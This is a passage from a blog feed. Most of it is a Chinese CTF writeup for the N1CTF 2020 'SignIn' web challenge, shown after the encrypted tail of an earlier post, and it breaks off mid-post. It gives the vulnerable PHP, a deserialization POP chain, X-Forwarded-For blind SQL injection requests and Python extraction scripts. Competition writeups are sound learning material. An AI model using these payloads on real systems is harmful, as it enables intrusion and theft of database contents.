8689e5231d21bdc4229c8df063f5e97626913b18cd3a8cdf1d8f51b158e5ed2e7066e73f5f163a64218910b7ebafd886f4fea49b0c58cdd35a2d583949eedc0c82ea260b0f6dfe33d11224a40821bb0ec98e057d5bf09af068ea35b84b08f65836b1e7767500416fbfa7faba2c6c196d497e516ff4438974561de5ca651a59b4e091e423f6a6d6bd02c99c6d8a11dc5cf45c1a75d29e67c432552945b5c8b89dd6d679bb3a65d83fac43fc97a24365e64b29f08b70a17794851f174fe04c14c47c1d6a4f47cdf401d369b9ed3e667302405eb22ed1cda497e75a2ce15a338d54267c2048da5a2742c0dd59d7897a2a230df196fa00a6b307bc6da0732b82eda69c72e473ae492663311f54b96e9e14fa22fc270d92ea71a9d51b15b75fbe7c8c4e495a8f826f5e454c0e0628e9de8dd9dce583fd34b8375f3b7d67f384d11e66eebf52e4b569646cafb9677be7d784ae3f26dc47f846452349507af39e36754ff99b1921ba03311d5bfc97b1d6dd2a54836cb2ec6b500ec4477e7748ae2fd6c16a8fcfcf2e4f44f87b66d766b315d055ce6e72ec6a2510adabddf989d7ca3808710029d871b3f86459bf55c8995d6a22b1d6ef7698eb8612f22769e2e6db83e10f089e07fc5ea04f07b9813f15cbaa60779cc190c0b542f540605cdb39f3c048c3e86f64a6bf3ed628073f1252eeb8d0534a10997bab8d824a5374ef07a778438f10e675abfde5eba6d729b87e4c3af22920fb9e29fece38b515e4da0b94c902dfd0df84580e1755ae0f4ed3a20156d2af786fb0332e289a852733911570b33adcf150d62f09e9a94670a7811742633cf38401ca14f9100dcaa99922adc870462ffc7a8516511e8fc85aa80754bbc883d9765407ba981d646a2c1e7225d7b835b894a33318430b6a0c8b7e33344100f3d12da7d0eed7bd95d58e47f9ef2bf82e25228dab77ac35d63475176264716ceb353c3c4e92f76f602b285f0e4daf25a84e88204dbe8c1c0b87d562160e3d76003d8b04e040d9fd7ea3090a41699c6f63d9ffb9dbb36b84d72c72df78f38c400c2414cce3ecf5b9263b2f80c907e88f5737fd081a651ccb63531695eb9b8d57635a2f88d888304834d9cbb90ab0aa6daed8848fe13be3a1399d0f38f98468240f60ed585fbb489f4455137db0baa0971d9b8d5a9d564c610f304a35424a1fa17675257770d6c2c45d5cb8de38577b499bcdd690e0c732877584e362883bba6fd2378280bbe8340ec0bf599a0b5c31475b06b4b61dddde0db87e608dbc500705b8b68872b5ed26552e063567b0fc0efaff8910f6cbe5bb3ec514092666eb942ef10525998122a08632d4cbe474ac7a9f29eb7a9b776ba4a7ab6c77db62d0db103aa43ce592defb57c34d4e10e6ff54d5cc2bafdb2ec138f08f38cdc0a46dc3d3cd8ee0d17dc998c2426d0dce81b09f940fe352f7d138e26ad5e2246bec8158cde28892cda9e0b9eaaf33ba00acf341df63c3fc96f147a8a90b1a5f585b9f8ac65461f6739e34f2682ad8ec69e8ab3fc8628a5587bf8d5c765d452f5cf5517b378634185457dfda7b5f166b664d268b7f9b413bb9383dbb21623f07ba00704226880af0780d8c5c70c3f1b3c88c4867c3344adaa7344ed289d7d973582252d99d2bd4ac1a73620870ef86a5930006f522bc9b25c619221a999f4d630ab28ed8d0455bb1bd75309cde9bbe967bdb3b156722b978a0b3f003a910fb65b118775e3bfc927285c1b389c0c3d6d0af06c0f5a6cd79796bd14fd1a4a86fe275e5b35baa30d98b117bbc7d5f980dd0981ab1e65c974fc17a4c7a11b81d8e69d818bbc1daa8163d4e378ab298cca34e3f16999a491f3c54edf89840f873f214b5e23b61b27d9c8e1c514a00946e43aae3162afd516f83984c94bf967f0eaf2376f36f49d1605b8775f5db401e3290dc77ced30a969b35ca2a0fbed2037acc62799030d35a741cd76ac32025571bc254bb1954a0fde0fc7a89a4f27df519745d8eb66436ddf9105c0d5ac29dd36b138b6be9304ffb4462fc6b31d79165a6b38000b02d28926558d40c14f2734a82d8be052a3caad67e16d53828c59f301635804b09ed33380fa2a145ee5a147f4dc0e6fa64164b4580137eea8b6c061a786b15b76c91290284bb1851938df26a25b236a40dd1af2bcf4046643027dacba92a51a6c1ccdaa9572b3a3cd9cd7f147bc38f5e5015cf56e0cebad6055332f976abe802d1f057cbc033483dae69378e033c1a088597a12ad508f0accaabcd0d74e0ba68e75bc3a377ba398a02feb1ee520acb2e061e1a445d5f7c14f58451e5275b34c6cde0b99b7355efd00dcd89ceecb0d593e5b78a3be72dbd2dd284a27c7f803b66c6fadb82f212641753f9b85e9ae98861ab3eac1e9aff6078cf412eab55aaafaea25a7d1ed21894ce9c4800afaeec7910e7b89c97e92ba8cb1e6ab8be6d4dc9b9c2233ed568b476a5a2c014aa939511836495eb4a2186f57b3289529dc4e22956ad263f9aa2456622e944854945d11f1ce279e85724d7630efdea6886960afbc246dd17c78f07a2bde1d04d7dff18f06c83bd295a2a70ca9e816211da8da4807575da28d6ee8da4d2055ad216de7b07886db0dc5989ddc285e34c02815400ef4d2ee890b485ab745cb99543226d6579a9484ed8ab0fbce8ccd2ba12033128803c459b969eccdfe9773b74db224612238eff6ad7513918bcf7c6bfceb2a720be6d00c8f8f7f656430ac5e86bd35ee121ef18a0a2347db044bffd2b9ebea8bf856a84bc0f1ec3be92a48b64819562d61a1119873780d32752c6213759e9ed3930b2af3f777eb5671444ab7dda4a375dc9034bb23a7874d3de78a1c9bd1afcac0b5443c9a0fc0cd0903e1a1d6c6a45fa9258d38d8b6ab4c5c47dbeaf6bda40f7eec896ac56c0b0ed4c35adbff303ef0e663f4f4757dbe28424cc7c64fdd5d99bcf73e04195fafaa4ed1e16e506e56a7c169c8397e0401d7ba7b0272e6cf1c5f49be0696f83e792343f3213af456b8c40e75e44b62b5a8ce4c35d4560612d29317e41e4184f127717dc97f702be9151a7a483648fa0604a745d23a2c9e26974f1d73d2bde239853deff1a2b34ee8e346972f151dfd1285b7c9dfa765f6f719d560a8a3a75caf063ba2aa205d5c21570fa824fce9c3adc61d137f09b51165aabf1d491f37f07da73c46a1cd19f88c4acca5d7fbf1ac236c55bfd6a5e955091fb4748e8e283825a8ce56769240f4fe474c0dd9ffbcf724d4a1de517760223c38598a67126f6117d6ce2e37533c</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
      <category term="漏洞复现" scheme="https://c1aysec.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="漏洞复现" scheme="https://c1aysec.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>2020 N1CTF writeup</title>
    <link href="https://c1aysec.github.io/2020/10/19/2020%20N1CTF%20writeup/"/>
    <id>https://c1aysec.github.io/2020/10/19/2020 N1CTF writeup/</id>
    <published>2020-10-19T04:18:12.227Z</published>
    <updated>2020-10-20T03:00:28.630Z</updated>
    
    <content type="html"><![CDATA[<p>队伍ID：GUTS，web狗个人参赛</p><p>做出的题目<br><img src="http://pic.c1imber.top/blog/20201019/96npVIgBXvdn.png?imageslim" alt="mark"></p><h3 id="web-SignIn"><a href="#web-SignIn" class="headerlink" title="web-SignIn"></a>web-SignIn</h3><p>这道题自己用注入注入出的key，然后通过key获取的flag，不知道其他师傅都是怎么解的</p><p>题目代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> </div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">ip</span> </span>&#123;</div><div class="line">    <span class="keyword">public</span> $ip;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($info)</span></span>&#123;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]))&#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;ip = <span class="keyword">$this</span>-&gt;waf($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]);</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;ip =$_SERVER[<span class="string">"REMOTE_ADDR"</span>];</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</div><div class="line">        $con=mysqli_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"********"</span>,<span class="string">"n1ctf_websign"</span>);</div><div class="line">        $sqlquery=sprintf(<span class="string">"INSERT into n1ip(`ip`,`time`) VALUES ('%s','%s')"</span>,<span class="keyword">$this</span>-&gt;waf($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]),time());</div><div class="line">        <span class="keyword">if</span>(!mysqli_query($con,$sqlquery))&#123;</div><div class="line">            <span class="keyword">return</span> mysqli_error($con);</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">            <span class="keyword">return</span> <span class="string">"your ip looks ok!"</span>;</div><div class="line">        &#125;</div><div class="line">        mysqli_close($con);</div><div class="line">    &#125;</div><div class="line">&#125;   </div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag</span> </span>&#123;</div><div class="line">    <span class="keyword">public</span> $ip;</div><div class="line">    <span class="keyword">public</span> $check;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($ip)</span> </span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;ip = $ip;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getflag</span><span class="params">()</span></span>&#123;</div><div class="line">    <span class="keyword">if</span>(md5(<span class="keyword">$this</span>-&gt;check)===md5(<span class="string">"key****************"</span>))&#123;</div><div class="line">    readfile(<span class="string">'/flag'</span>);</div><div class="line">    &#125;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;ip;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">if</span>(stristr(<span class="keyword">$this</span>-&gt;ip, <span class="string">"n1ctf"</span>)!==<span class="keyword">False</span>)</div><div class="line">            <span class="keyword">$this</span>-&gt;ip = <span class="string">"welcome to n1ctf2020"</span>;</div><div class="line">        <span class="keyword">else</span></div><div class="line">            <span class="keyword">$this</span>-&gt;ip = <span class="string">"noip"</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;getflag();</div><div class="line">    &#125;   </div><div class="line"></div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'input'</span>]))&#123;</div><div class="line">    $input = $_GET[<span class="string">'input'</span>];</div><div class="line">unserialize($input);</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>查看代码，在flag类当中的getflag方法当中可以获取flag，但是需要满足<code>md5($this-&gt;check)===md5(&quot;key****************&quot;)</code>，所以需要先获取<code>key****************</code>的值</p><p>在<code>$sqlquery=sprintf(&quot;INSERT into n1ip(`ip`,`time`) VALUES (&#39;%s&#39;,&#39;%s&#39;)&quot;,$this-&gt;waf($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]),time());</code>这段代码位置可能存在sql注入，可以通过构造反序列化先到这一步</p><p>刚好flag类当中<code>__wakeup</code>方法的位置使用了<code>stristr</code>字符串函数，所有这里可以触发ip类的<code>__toString</code>方法</p><p>构造pop链</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">ip</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line">&#125;   </div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line">    <span class="keyword">public</span> $ip;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;ip=<span class="keyword">new</span> ip();</div><div class="line">    &#125;</div><div class="line">&#125;   </div><div class="line"></div><div class="line">$obj=<span class="keyword">new</span> flag();</div><div class="line"><span class="keyword">echo</span> serialize($obj);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">O:<span class="number">4</span>:<span class="string">"flag"</span>:<span class="number">1</span>:&#123;s:<span class="number">2</span>:<span class="string">"ip"</span>;O:<span class="number">2</span>:<span class="string">"ip"</span>:<span class="number">0</span>:&#123;&#125;&#125;</div></pre></td></tr></table></figure><p>添加X-Forwarded-For头发送即可，但是这里经过了ip类的waf函数，这里并不知道过滤了什么，简单测试了一下，输入sleep等关键字会提示hackhack</p><p>尝试了好久的注入，发现并没有明显的响应可以判断是否存在注入，被这个<code>$this-&gt;waf</code>卡了好久</p><p>于是又仔细读了一遍代码，发现在ip类当中返回了sql的错误信息，但是并没有输出到页面当中，而是赋值给了flag类当中的<code>$this-&gt;ip</code></p><p><img src="http://pic.c1imber.top/blog/20201019/xneAxLf2mmUj.png?imageslim" alt="mark"></p><p>那么如果这里返回的错误信息当中有n1ctf就会输出welcome to n1ctf2020,否则就会输出noip，所以可以通过这种方式进行盲注</p><p>于是需要解决的问题就变为了如何让sql错误信息当中出现n1ctf，查看代码看到当前的数据库名刚好为n1ctf_websign，于是构造：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">GET /index.php?input=O:4:%22flag%22:1:&#123;s:2:%22ip%22;O:2:%22ip%22:0:&#123;&#125;&#125; HTTP/1.1</div><div class="line">Host: 101.32.205.189</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Connection: close</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line">Cache-Control: max-age=0</div><div class="line">X-Forwarded-For: 1.1.1.1&apos; and updatexml(1,if((1=1),1,concat(0x3a,database())),1) and &apos;1&apos;=&apos;</div></pre></td></tr></table></figure><p>此时if判断为true，执行了<code>INSERT into n1ip(`ip`,`time`) VALUES (&#39;1.1.1.1&#39; and updatexml(1,1,1) and &#39;1&#39;=&#39;&#39;,time())</code>，语句没有产生报错，所以返回noip<br><img src="http://pic.c1imber.top/blog/20201019/oeliQVlUrcYw.png?imageslim" alt="mark"></p><p>构造：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">GET /index.php?input=O:4:%22flag%22:1:&#123;s:2:%22ip%22;O:2:%22ip%22:0:&#123;&#125;&#125; HTTP/1.1</div><div class="line">Host: 101.32.205.189</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Connection: close</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line">Cache-Control: max-age=0</div><div class="line">X-Forwarded-For: 1.1.1.1&apos; and updatexml(1,if((1=2),1,concat(0x3a,database())),1) and &apos;1&apos;=&apos;</div></pre></td></tr></table></figure><p>此时if判断为false，语句执行了<code>INSERT into n1ip(`ip`,`time`) VALUES (&#39;1.1.1.1&#39; and updatexml(1,concat(0x3a,database()),1) and &#39;1&#39;=&#39;&#39;,time())</code>，后端sql报错信息大概是<code>XPATH syntax error: &#39;:n1ctf_websign&#39;</code>，错误信息返回给了flag类的<code>$this-&gt;ip</code>，从报错信息当中匹配到了n1ctf，于是这里输出了welcome to n1ctf2020</p><p><img src="http://pic.c1imber.top/blog/20201019/zRDmddNxLzGp.png?imageslim" alt="mark"></p><p>为了方便理解，可以看下面两张图：</p><p><img src="http://pic.c1imber.top/blog/20201019/yJPwEKA1y5x5.png?imageslim" alt="mark"></p><p><img src="http://pic.c1imber.top/blog/20201019/SDj1pxAY1PO3.png?imageslim" alt="mark"></p><p>接着盲注，首先获取表名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">GET /index.php?input=O:4:%22flag%22:1:&#123;s:2:%22ip%22;O:2:%22ip%22:0:&#123;&#125;&#125; HTTP/1.1</div><div class="line">Host: 101.32.205.189</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Connection: close</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line">Cache-Control: max-age=0</div><div class="line">X-Forwarded-For: 1.1.1.1&apos; and updatexml(1,if(((select length(group_concat(table_name)) from information_schema.tables where table_schema=database())=10),1,concat(0x3a,database())),1) and &apos;1&apos;=&apos;</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20201019/7BzQoMG6PUpx.png?imageslim" alt="mark"></p><p>通过代码已知一个表n1ip，group_concat(table_name)总长度为10，于是剩下一个表长度为5（因为group_concat结果中有一个逗号）<br>推测另一个表为n1key,推测成立</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">GET /index.php?input=O:4:%22flag%22:1:&#123;s:2:%22ip%22;O:2:%22ip%22:0:&#123;&#125;&#125; HTTP/1.1</div><div class="line">Host: 101.32.205.189</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Connection: close</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line">Cache-Control: max-age=0</div><div class="line">X-Forwarded-For: 1.1.1.1&apos; and updatexml(1,if(((select table_name from information_schema.tables where table_schema=database() limit 1,1)=&apos;n1key&apos;),1,concat(0x3a,database())),1) and &apos;1&apos;=&apos;</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20201019/v1XC5qtJWGBu.png?imageslim" alt="mark"></p><p>获取n1key表当中的列名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">GET /index.php?input=O:4:%22flag%22:1:&#123;s:2:%22ip%22;O:2:%22ip%22:0:&#123;&#125;&#125; HTTP/1.1</div><div class="line">Host: 101.32.205.189</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Connection: close</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line">Cache-Control: max-age=0</div><div class="line">X-Forwarded-For: 1.1.1.1&apos; and updatexml(1,if(((select length(group_concat(column_name)) from information_schema.columns where table_name=&apos;n1key&apos;)=6),1,concat(0x3a,database())),1) and &apos;1&apos;=&apos;</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20201019/ryuxqTqw3HWH.png?imageslim" alt="mark"></p><p>判断出group_concat(column_name)长度为6</p><p>编写获取列名脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests </div><div class="line"></div><div class="line">session = requests.Session()    </div><div class="line"></div><div class="line">column=<span class="string">""</span>   </div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">7</span>):</div><div class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">97</span>,<span class="number">127</span>):</div><div class="line">        paramsGet = &#123;<span class="string">"input"</span>:<span class="string">"O:4:\"flag\":1:&#123;s:2:\"ip\";O:2:\"ip\":0:&#123;&#125;&#125;"</span>&#125;</div><div class="line">        headers = &#123;<span class="string">"Accept"</span>:<span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"</span>,<span class="string">"Cache-Control"</span>:<span class="string">"max-age=0"</span>,<span class="string">"Upgrade-Insecure-Requests"</span>:<span class="string">"1"</span>,<span class="string">"User-Agent"</span>:<span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0"</span>,<span class="string">"Connection"</span>:<span class="string">"close"</span>,<span class="string">"X-Forwarded-For"</span>:<span class="string">"1.1.1.1' and updatexml(1,if(((select ascii(substr(group_concat(column_name),&#123;&#125;,1)) from information_schema.columns where table_name='n1key')=&#123;&#125;),1,concat(0x3a,database())),1) and '1'='"</span>.format(i,j),<span class="string">"Accept-Language"</span>:<span class="string">"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"</span>,<span class="string">"Accept-Encoding"</span>:<span class="string">"gzip, deflate"</span>&#125;</div><div class="line">        <span class="comment">#print headers</span></div><div class="line">        response = session.get(<span class="string">"http://101.32.205.189/index.php"</span>, params=paramsGet, headers=headers)</div><div class="line">        <span class="comment">#print response.content</span></div><div class="line">        <span class="keyword">if</span> <span class="string">"&lt;code&gt;noip&lt;/code&gt;&lt;/pre&gt;"</span> <span class="keyword">in</span> response.content:</div><div class="line">            column+=chr(j)</div><div class="line">            <span class="keyword">print</span> column</div><div class="line">            <span class="keyword">break</span></div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20201019/i4CnEN4f77Ru.png?imageslim" alt="mark"></p><p>两列：id和key</p><p>获取key的时候需要使用<code>select `key` from n1key</code>,直接<code>select key</code>会出现sql语法错误，这一点需要注意</p><p><img src="http://pic.c1imber.top/blog/20201020/c0KMUOSAwsty.png?imageslim" alt="mark"></p><p>判断出n1key当中key列内容长度为25</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">GET /index.php?input=O:4:%22flag%22:1:&#123;s:2:%22ip%22;O:2:%22ip%22:0:&#123;&#125;&#125; HTTP/1.1</div><div class="line">Host: 101.32.205.189</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Connection: close</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line">Cache-Control: max-age=0</div><div class="line">X-Forwarded-For: 1.1.1.1&apos; and updatexml(1,if(((select length(`key`) from n1key)=25),1,concat(0x3a,database())),1) and &apos;1&apos;=&apos;</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20201019/iugN92MoTJQf.png?imageslim" alt="mark"></p><p>编写获取key脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests </div><div class="line"></div><div class="line">l=<span class="string">"1234567890qazxswedcvfrtgbnhyujmkiolp"</span></div><div class="line">session = requests.Session()</div><div class="line">key=<span class="string">""</span>  </div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">26</span>):</div><div class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> l:</div><div class="line">        paramsGet = &#123;<span class="string">"input"</span>:<span class="string">"O:4:\"flag\":1:&#123;s:2:\"ip\";O:2:\"ip\":0:&#123;&#125;&#125;"</span>&#125;</div><div class="line">        headers = &#123;<span class="string">"Accept"</span>:<span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"</span>,<span class="string">"Cache-Control"</span>:<span class="string">"max-age=0"</span>,<span class="string">"Upgrade-Insecure-Requests"</span>:<span class="string">"1"</span>,<span class="string">"User-Agent"</span>:<span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0"</span>,<span class="string">"Connection"</span>:<span class="string">"close"</span>,<span class="string">"X-Forwarded-For"</span>:<span class="string">"1.1.1.1' and updatexml(1,if(((select substr(`key`,&#123;&#125;,1) from n1key)='&#123;&#125;'),1,concat(0x3a,database())),1) and '1'='"</span>.format(i,j),<span class="string">"Accept-Language"</span>:<span class="string">"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"</span>,<span class="string">"Accept-Encoding"</span>:<span class="string">"gzip, deflate"</span>&#125;</div><div class="line">        response = session.get(<span class="string">"http://101.32.205.189/index.php"</span>, params=paramsGet, headers=headers)</div><div class="line">        <span class="keyword">if</span> <span class="string">"&lt;code&gt;noip&lt;/code&gt;&lt;/pre&gt;"</span> <span class="keyword">in</span> response.content:</div><div class="line">            key+=j</div><div class="line">            <span class="keyword">print</span> key</div><div class="line">            <span class="keyword">break</span></div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20201019/LLgzWYcmT0vu.png?imageslim" 